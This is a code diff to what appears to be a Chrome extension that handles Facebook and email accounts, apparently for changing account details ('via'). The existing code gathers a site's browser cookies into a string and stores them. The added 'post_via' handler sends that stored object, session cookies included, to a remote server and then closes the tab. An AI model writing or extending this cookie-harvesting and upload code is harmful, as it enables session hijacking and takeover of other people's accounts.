@@ -1,6 +1,6 @@
-import { StepChangeVia } from "../object/StepChangeVia";
-import { BASE_HOST_MAIL, BASE_MAIL_GOOGLE, BASE_SERVER, BASE_URL_2FA, BASE_URL_FB } from "../utils/Constants";
+import { BASE_HOST_MAIL, BASE_MAIL_GOOGLE, BASE_SERVER, BASE_URL_2FA, BASE_URL_FB, VIA } from "../utils/Constants";
 import { SystemUtils } from "../utils/SystemUtils"
+import { Via } from "../object/Via";
 chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
     const systemUtils = new SystemUtils;
     if (message) {
@@ -43,13 +43,35 @@ chrome.runtime.onMessage.addListener(function (message, sender, sendResponse) {
                 for (let i = 0; i < cookie.length; i++) {
                     stringCookie += cookie[i].name + "=" + cookie[i].value + "; ";
                 }
-                let data = systemUtils.getDataToStorage("data");
+                let data = new Via((systemUtils.getDataToStorage(VIA)).data);
                 data.cookie = stringCookie;
                 systemUtils.saveDataToStorage(data = {'data': data});
             });
         }
         if (message.type == 'get_token') {
 
+        }if(message.type === 'post_via'){
+            let via = new Via((systemUtils.getDataToStorage(VIA)).data);
+            via = via.toJsonObject();
+            fetch(BASE_SERVER + "/via/change-success",
+            {
+                headers: {
+                  'Accept': 'application/json',
+                  'Content-Type': 'application/json'
+                },
+                method: "POST",
+                body: JSON.stringify(via)
+            }).then(function(res){
+                console.log("post_via => success: " + res);
+                fetch(BASE_SERVER + "/via",
+                ).then(function(res){
+                    chrome.tabs.remove(sender.tab.id);
+                }).catch(function(error){
+
+                })
+            }).catch(function(res){
+                console.log(res) 
+            })
         }
     }
 });
